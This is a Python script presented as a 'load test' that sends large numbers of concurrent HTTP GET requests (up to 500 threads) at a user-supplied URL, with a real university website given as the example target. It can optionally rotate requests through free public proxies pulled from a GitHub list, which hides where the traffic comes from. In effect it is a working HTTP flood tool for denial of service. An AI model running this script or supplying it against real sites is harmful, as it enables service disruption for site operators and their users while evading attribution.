import requests
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# =========================
# CONFIG INPUT
# =========================

target = input("Enter target URL (example: https://puchd.ac.in/): ")
threads = int(input("Threads (1-500): "))
duration = int(input("Duration (seconds): "))
timeout = int(input("Request timeout (seconds): "))

use_proxies = input("Use proxy rotation? (yes/no): ").lower() in ["yes", "y"]

# =========================
# GLOBAL STATS
# =========================

success = 0
fails = 0
total = 0
lock = threading.Lock()

# =========================
# FETCH PROXIES
# =========================

def fetch_proxies():
    try:
        url = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
        res = requests.get(url, timeout=10)
        proxy_list = res.text.splitlines()
        print(f"[+] Loaded {len(proxy_list)} proxies")
        return proxy_list
    except:
        print("[-] Failed to fetch proxies")
        return []

proxies_list = fetch_proxies() if use_proxies else []

def get_proxy():
    proxy = random.choice(proxies_list)
    return {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }

# =========================
# REQUEST FUNCTION
# =========================

def send_request():
    global success, fails, total

    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            proxy = get_proxy() if use_proxies and proxies_list else None

            r = requests.get(
                target,
                timeout=timeout,
                proxies=proxy
            )

            with lock:
                total += 1
                if r.status_code < 400:
                    success += 1
                else:
                    fails += 1

        except:
            with lock:
                total += 1
                fails += 1

# =========================
# MONITOR
# =========================

def monitor():
    start = time.time()

    while time.time() - start < duration:
        time.sleep(1)
        print(
            f"\rTotal: {total} | Success: {success} | Fails: {fails}",
            end=""
        )

# =========================
# START TEST
# =========================

print("\n[+] Starting load test...\n")

monitor_thread = threading.Thread(target=monitor)
monitor_thread.start()

with ThreadPoolExecutor(max_workers=threads) as executor:
    for _ in range(threads):
        executor.submit(send_request)

monitor_thread.join()

print("\n\n[✔] Test Completed")
print(f"Total Requests: {total}")
print(f"Success: {success}")
print(f"Fails: {fails}")